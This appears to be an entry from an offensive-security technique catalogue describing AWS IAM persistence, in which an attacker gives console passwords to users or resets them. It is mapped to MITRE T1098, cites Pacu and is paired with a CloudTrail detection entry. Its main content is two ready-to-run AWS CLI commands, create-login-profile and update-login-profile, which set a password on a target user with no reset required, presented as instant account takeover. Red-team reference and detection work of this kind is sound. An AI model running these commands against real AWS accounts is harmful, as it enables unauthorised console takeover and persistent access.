---
id: aws-console-login-profile
title: AWS console takeover (Create/UpdateLoginProfile)
section: AWS / cloud IAM
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1098]
platform: [cloud]
source: Rhino Security Labs (Pacu), AWS IAM privesc/persistence
pair: aws-loginprofile-cloudtrail
---

Give a programmatic-only IAM user (or yourself) a console password with
`CreateLoginProfile`, or reset another user's with `UpdateLoginProfile` — instant
interactive console access / account takeover. Pairs naturally with the access-key
backdoor: one gives API creds, this gives the web console. Pacu automates it.
(Cloud — no slots.)

```sh
aws iam create-login-profile --user-name <target-user> --password '<Passw0rd!>' --no-password-reset-required
aws iam update-login-profile --user-name <target-user> --password '<Passw0rd!>'
```
